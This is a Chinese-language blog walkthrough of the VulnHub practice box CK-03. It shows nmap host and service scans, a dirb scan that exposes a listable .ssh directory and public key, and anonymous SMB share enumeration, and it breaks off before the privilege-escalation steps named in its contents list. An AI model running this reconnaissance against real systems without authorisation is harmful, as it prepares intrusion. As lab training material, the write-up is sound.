<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.0.2"><link rel="apple-touch-icon" sizes="180x180" href="/images/01.jpg"><link rel="icon" type="image/png" sizes="32x32" href="/images/01.jpg"><link rel="icon" type="image/png" sizes="16x16" href="/images/01.jpg"><link rel="mask-icon" href="/images/logo.svg" color="#222"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="google-site-verification" content="h6ecMlAUCMDTIJmEha3N3mJmMydid5XY8AbS767rKtM"><meta name="baidu-site-verification" content="T0YB7GSdOB"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><script class="hexo-configurations">var NexT=window.NexT||{},CONFIG={hostname:"lunamoore.github.io",root:"/",scheme:"Muse",version:"8.0.0-rc.5",exturl:!0,sidebar:{position:"left",display:"post",padding:18,offset:12},copycode:!0,bookmark:{enable:!1,color:"#222",save:"auto"},fancybox:!0,mediumzoom:!1,lazyload:!1,pangu:!1,comments:{style:"tabs",active:null,storage:!0,lazyload:!1,nav:null},motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"fadeInDown",post_body:"fadeInDown",coll_header:"fadeInLeft",sidebar:"fadeInUp"}},prism:!1,path:"search.xml",localsearch:{enable:!0,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1}}</script><meta name="description" content="0x00官网描述 This box is upgraded edition of previous (MyFileServer 2) box. Multiple way to get user and root flags are added. Ping me on twitter @CyberKnight00 if you face any difficulty. Don’t stop afte"><meta property="og:type" content="article"><meta property="og:title" content="CK-03"><meta property="og:url" content="https://lunamoore.github.io/2020/09/26/CK-03/index.html"><meta property="og:site_name" content="Lluna&#39;s Pure land."><meta property="og:description" content="0x00官网描述 This box is upgraded edition of previous (MyFileServer 2) box. Multiple way to get user and root flags are added. Ping me on twitter @CyberKnight00 if you face any difficulty. Don’t stop afte"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://lunamoore.github.io/2020/09/26/CK-03/image-20200925201803610.png"><meta property="og:image" content="https://lunamoore.github.io/2020/09/26/CK-03/image-20200925202904665.png"><meta property="og:image" content="https://lunamoore.github.io/2020/09/26/CK-03/image-20200925203157919.png"><meta property="og:image" content="https://lunamoore.github.io/2020/09/26/CK-03/image-20200925203239246.png"><meta property="og:image" content="https://lunamoore.github.io/2020/09/26/CK-03/image-20200926095848740.png"><meta property="article:published_time" content="2020-09-26T02:11:41.000Z"><meta property="article:modified_time" content="2020-09-26T02:15:29.037Z"><meta property="article:author" content="Lluna"><meta property="article:tag" content="靶机"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://lunamoore.github.io/2020/09/26/CK-03/image-20200925201803610.png"><link rel="canonical" href="https://lunamoore.github.io/2020/09/26/CK-03/"><script class="page-configurations">CONFIG.page={sidebar:"",isHome:!1,isPost:!0,lang:"zh-CN"}</script><title>CK-03 | Lluna's Pure land.</title><noscript><style>body{margin-top:2rem}.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header,.use-motion .sidebar{visibility:visible}.use-motion .footer,.use-motion .header,.use-motion .site-brand-container .toggle{opacity:initial}.use-motion .custom-logo-image,.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line{transform:scaleX(1)}.search-pop-overlay,.sidebar-nav{display:none}.sidebar-panel{display:block}</style></noscript><link rel="alternate" href="/atom.xml" title="Lluna's Pure land." type="application/atom+xml"></head><body itemscope itemtype="http://schema.org/WebPage" class="use-motion"><div class="headband"></div><main class="main"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="切换导航栏"><span class="toggle-line"></span> <span class="toggle-line"></span> <span class="toggle-line"></span></div></div><div class="site-meta"><a href="/" class="brand" rel="start"><i class="logo-line"></i><h1 class="site-title">Lluna's Pure land.</h1><i class="logo-line"></i></a><p class="site-subtitle" itemprop="description">What is life like when singing to wine?</p></div><div class="site-nav-right"><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class="site-nav"><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home // 首页 fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user // 关于 fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags // 标签 fa-fw"></i>标签<span class="badge">7</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th // 分类 fa-fw"></i>分类<span class="badge">12</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive // 归档 fa-fw"></i>归档<span class="badge">34</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar //日程表 fa-fw"></i>日程表</a></li><li class="menu-item menu-item-movies"><a href="/movies" rel="section"><i class="fa fa-film // 电影 fa-fw"></i>电影</a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索</a></li></ul></nav><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"><input autocomplete="off" autocapitalize="off" maxlength="80" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span></div><div class="search-result-container"><div class="no-result"><i class="fa fa-spinner fa-pulse fa-5x"></i></div></div></div></div></div><div class="toggle sidebar-toggle"><span class="toggle-line"></span> <span class="toggle-line"></span> <span class="toggle-line"></span></div><aside class="sidebar"><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class="sidebar-nav"><li class="sidebar-nav-toc">文章目录</li><li class="sidebar-nav-overview">站点概览</li></ul><section class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00%E5%AE%98%E7%BD%91%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">0x00官网描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F"><span class="nav-number">2.</span> <span class="nav-text">0x01.主机扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">3.</span> <span class="nav-text">0x02.端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3"><span class="nav-number">4.</span> <span class="nav-text">0x03.访问80端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E6%89%AB%E6%8F%8F%E7%9B%AE%E5%BD%95"><span class="nav-number">5.</span> <span class="nav-text">0x04.扫描目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E6%B5%8F%E8%A7%88-ssh%E7%9B%AE%E5%BD%95"><span class="nav-number">6.</span> <span class="nav-text">0x05.浏览.ssh目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E6%B5%8F%E8%A7%88SMB%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%89%80%E5%88%86%E4%BA%AB%E5%87%BA%E6%9D%A5%E7%9A%84%E6%89%80%E6%9C%89%E8%B5%84%E6%BA%90"><span class="nav-number">7.</span> <span class="nav-text">0x06.浏览SMB服务器端所分享出来的所有资源</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-%E7%99%BB%E5%85%A5%E5%88%B0%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="nav-number">8.</span> <span class="nav-text">0x07.登入到服务端</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-john%E7%A0%B4%E8%A7%A3"><span class="nav-number">9.</span> <span class="nav-text">0x08.john破解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-%E7%99%BB%E5%85%A5"><span class="nav-number">10.</span> <span class="nav-text">0x09.登入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x10-%E6%8F%90%E6%9D%83"><span class="nav-number">11.</span> <span class="nav-text">0x10.提权</span></a></li></ol></div></section><section class="site-overview-wrap sidebar-panel"><div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" alt="Lluna" src="/images/01.jpg"><p class="site-author-name" itemprop="name">Lluna</p><div class="site-description" itemprop="description">A primary school student in the field of Cyberspace Security!</div></div><div class="site-state-wrap animated"><nav class="site-state"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">34</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">12</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"><a href="/tags/"><span class="site-state-item-count">7</span> <span class="site-state-item-name">标签</span></a></div></nav></div><div class="links-of-author animated"><span class="links-of-author-item"><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x1bmFtb29yZQ==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;lunamoore"><i class="fab fa-github fa-fw"></i></span> </span><span class="links-of-author-item"><span class="exturl" data-url="bWFpbHRvOmppeWViYWxhYmFsYUAxMjYuY29t" title="E-Mail → mailto:jiyebalabala@126.com"><i class="fa fa-envelope fa-fw"></i></span></span></div><div class="cc-license animated" itemprop="license"><span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></span></div><div class="links-of-blogroll animated"><div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i> 友链</div><ul class="links-of-blogroll-list"><li class="links-of-blogroll-item"><span class="exturl" data-url="aHR0cHM6Ly92YWxlY2FzZWMuZ2l0aHViLmlv" title="https:&#x2F;&#x2F;valecasec.github.io">valecalida's house</span></li></ul></div></section></div></aside><div class="sidebar-dimmer"></div></header><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span>0%</span></div><div class="reading-progress-bar"></div><span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x1bmFtb29yZS8=" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin:130px 106px" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span><noscript><div class="noscript-warning">Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://lunamoore.github.io/2020/09/26/CK-03/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/01.jpg"><meta itemprop="name" content="Lluna"><meta itemprop="description" content="A primary school student in the field of Cyberspace Security!"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Lluna's Pure land."></span><header class="post-header"><h1 class="post-title" itemprop="name headline">CK-03</h1><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2020-09-26 10:11:41" itemprop="dateCreated datePublished" datetime="2020-09-26T10:11:41+08:00">2020-09-26</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2020-09-26 10:15:29" itemprop="dateModified" datetime="2020-09-26T10:15:29+08:00">2020-09-26</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/vulnhub/" itemprop="url" rel="index"><span itemprop="name">vulnhub</span></a> </span>， <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/vulnhub/CK/" itemprop="url" rel="index"><span itemprop="name">CK</span></a> </span></span><span id="/2020/09/26/CK-03/" class="post-meta-item leancloud_visitors" data-flag-title="CK-03" title="阅读次数"><span class="post-meta-item-icon"><i class="far fa-eye"></i> </span><span class="post-meta-item-text">阅读次数：</span> <span class="leancloud-visitors-count"></span> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2020/09/26/CK-03/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2020/09/26/CK-03/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>41k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>37 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h2 id="0x00官网描述"><a href="#0x00官网描述" class="headerlink" title="0x00官网描述"></a>0x00官网描述</h2><blockquote><p>This box is upgraded edition of previous (MyFileServer 2) box.</p><p>Multiple way to get user and root flags are added.</p><p>Ping me on twitter @CyberKnight00 if you face any difficulty.</p><p>Don’t stop after finding 1 way there are more ways.</p><p>This works better with VirtualBox than VMware.</p></blockquote><a id="more"></a><h2 id="0x01-主机扫描"><a href="#0x01-主机扫描" class="headerlink" title="0x01.主机扫描"></a>0x01.主机扫描</h2><p><code>根据MAC地址得到目标主机为192.168.1.14</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/ck00# nmap -sP 192.168.1.0/24 -oN nmap.sP</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-25 15:59 EDT</span><br><span class="line">Nmap scan report for 192.168.1.1</span><br><span class="line">Host is up (0.00058s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:01 (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.14</span><br><span class="line">Host is up (0.00040s latency).</span><br><span class="line">MAC Address: 00:0C:29:D5:67:2B (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.20</span><br><span class="line">Host is up (0.000063s latency).</span><br><span class="line">MAC Address: 00:50:56:FB:E6:6D (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.10</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (4 hosts up) scanned in 28.04 seconds</span><br></pre></td></tr></table></figure><h2 id="0x02-端口扫描"><a href="#0x02-端口扫描" class="headerlink" title="0x02.端口扫描"></a>0x02.端口扫描</h2><p><code>得到以下端口，可以看到ftp端口允许anonymous登入</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/ck00# nmap -sC -sV -sT 192.168.1.14 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-25 16:09 EDT</span><br><span class="line">Nmap scan report for 192.168.1.14</span><br><span class="line">Host is up (0.0015s latency).</span><br><span class="line">Not shown: 992 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">21/tcp   open  ftp         vsftpd 3.0.2</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_drwxrwxrwx    3 0        0              16 Feb 19  2020 pub [NSE: writeable]</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.1.10</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 3</span><br><span class="line">|      vsFTPd 3.0.2 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 75:fa:37:d1:62:4a:15:87:7e:21:83:b9:2f:ff:04:93 (RSA)</span><br><span class="line">|   256 b8:db:2c:ca:e2:70:c3:eb:9a:a8:cc:0e:a2:1c:68:6b (ECDSA)</span><br><span class="line">|_  256 66:a3:1b:55:ca:c2:51:84:41:21:7f:77:40:45:d4:9f (ED25519)</span><br><span class="line">80/tcp   open  http        Apache httpd 2.4.6 ((CentOS))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/2.4.6 (CentOS)</span><br><span class="line">|_http-title: My File Server</span><br><span class="line">111/tcp  open  rpcbind     2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service                                                                                                                   </span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind                                                                                                                   </span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind                                                                                                                   </span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind                                                                                                                   </span><br><span class="line">|   100000  3,4          111/udp6  rpcbind                                                                                                                   </span><br><span class="line">|   100003  3,4         2049/tcp   nfs                                                                                                                       </span><br><span class="line">|   100003  3,4         2049/tcp6  nfs</span><br><span class="line">|   100003  3,4         2049/udp   nfs</span><br><span class="line">|   100003  3,4         2049/udp6  nfs</span><br><span class="line">|   100005  1,2,3      20048/tcp   mountd</span><br><span class="line">|   100005  1,2,3      20048/tcp6  mountd</span><br><span class="line">|   100005  1,2,3      20048/udp   mountd</span><br><span class="line">|   100005  1,2,3      20048/udp6  mountd</span><br><span class="line">|   100021  1,3,4      43810/tcp   nlockmgr</span><br><span class="line">|   100021  1,3,4      44598/udp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      47781/tcp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      52409/udp   nlockmgr</span><br><span class="line">|   100024  1          35697/tcp6  status</span><br><span class="line">|   100024  1          38764/tcp   status</span><br><span class="line">|   100024  1          40593/udp6  status</span><br><span class="line">|   100024  1          54638/udp   status</span><br><span class="line">|   100227  3           2049/tcp   nfs_acl</span><br><span class="line">|   100227  3           2049/tcp6  nfs_acl</span><br><span class="line">|   100227  3           2049/udp   nfs_acl</span><br><span class="line">|_  100227  3           2049/udp6  nfs_acl</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 4.9.1 (workgroup: SAMBA)</span><br><span class="line">2049/tcp open  nfs_acl     3 (RPC #100227)</span><br><span class="line">2121/tcp open  ftp         ProFTPD 1.3.5</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_drwxrwxrwx   3 root     root           16 Feb 19  2020 pub [NSE: writeable]</span><br><span class="line">MAC Address: 00:0C:29:D5:67:2B (VMware)</span><br><span class="line">Service Info: Host: FILESERVER; OS: Unix</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -1h49m53s, deviation: 3h10m19s, median: 0s</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.9.1)</span><br><span class="line">|   Computer name: localhost</span><br><span class="line">|   NetBIOS computer name: FILESERVER\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: localhost</span><br><span class="line">|_  System time: 2020-09-26T01:39:56+05:30</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: &lt;blank&gt;</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-09-25T20:09:36</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 58.30 seconds</span><br><span class="line">root@JIYE:~/vulnhub/ck00#</span><br></pre></td></tr></table></figure><h2 id="0x03-访问80端口"><a href="#0x03-访问80端口" class="headerlink" title="0x03.访问80端口"></a>0x03.访问80端口</h2><p><code>仅仅是一个静态页面，且可以重定向到一个网站</code></p><img src="/2020/09/26/CK-03/image-20200925201803610.png"><h2 id="0x04-扫描目录"><a href="#0x04-扫描目录" class="headerlink" title="0x04.扫描目录"></a>0x04.扫描目录</h2><p><code>得到.ssh目录</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/ck00# dirb http://192.168.1.14</span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line">START_TIME: Fri Sep 25 16:26:08 2020</span><br><span class="line">URL_BASE: http://192.168.1.14/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">-----------------</span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line">---- Scanning URL: http://192.168.1.14/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.14/.ssh/</span><br><span class="line">+ http://192.168.1.14/cgi-bin/ (CODE:403|SIZE:210)</span><br><span class="line">+ http://192.168.1.14/index.html (CODE:200|SIZE:174)                              </span><br><span class="line">---- Entering directory: http://192.168.1.14/.ssh/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Fri Sep 25 16:26:12 2020</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 2</span><br><span class="line">root@JIYE:~/vulnhub/ck00#</span><br></pre></td></tr></table></figure><h2 id="0x05-浏览-ssh目录"><a href="#0x05-浏览-ssh目录" class="headerlink" title="0x05.浏览.ssh目录"></a>0x05.浏览.ssh目录</h2><p><code>发现两个文件，第一个为公钥，第二个为私钥，但拒绝访问</code></p><img src="/2020/09/26/CK-03/image-20200925202904665.png"><p><code>浏览文件</code></p><img src="/2020/09/26/CK-03/image-20200925203157919.png"> <img src="/2020/09/26/CK-03/image-20200925203239246.png"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCaOJE+/p4Y988V1I/soMH5RgdIavic3jBph74ZSUGWCf9I8mdmA6BszNd/QIxSbCXufb8r/yPMuoTDetJNXHyvb3RvPsSQ86N12G+ZaQATcGdf67S8WB+9vGJAPRxbbZiaokBjNXkGvAXs2mDhhtgiNjbnn3fb4KNvdeNJ/+xhZCRwknmKtf55zMgv2kFXFfmJO0kVogVYncnmsNohd0wJuImDJVHuGqvg9KmFCjb/gMhfh0jTIZB7cuseaKAzY8O2g4tMRNyVG5zwAmHkH0D00Du6ssXn1ZMCRq/imdDV7It1+L14d6bDTRCqm2FLRcKcx5PohJC1ElnzTkvhalEx smbuser@FileServer_CK10-test</span><br></pre></td></tr></table></figure><h2 id="0x06-浏览SMB服务器端所分享出来的所有资源"><a href="#0x06-浏览SMB服务器端所分享出来的所有资源" class="headerlink" title="0x06.浏览SMB服务器端所分享出来的所有资源"></a>0x06.浏览SMB服务器端所分享出来的所有资源</h2><p><code>可以发现两个目录为smbdata、smbuser，同时也是两个用户</code></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuc2FtYmEub3JnL3NhbWJhL2RvY3MvY3VycmVudC9tYW4taHRtbC9zbWJjbGllbnQuMS5odG1s">smbclient参考<i class="fa fa-external-link-alt"></i></span></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/ck00# smbclient -L 192.168.1.14</span><br><span class="line">Enter WORKGROUP\root&#x27;s password: </span><br><span class="line">Anonymous login successful</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        print$          Disk      Printer Drivers</span><br><span class="line">        smbdata         Disk      smbdata</span><br><span class="line">        smbuser         Disk      smbuser</span><br><span class="line">        IPC$            IPC       IPC Service (Samba 4.9.1)</span><br><span class="line">SMB1 disabled -- no workgroup available</span><br><span class="line">root@JIYE:~/vulnhub/ck00#</span><br></pre></td></tr></table></figure><h2 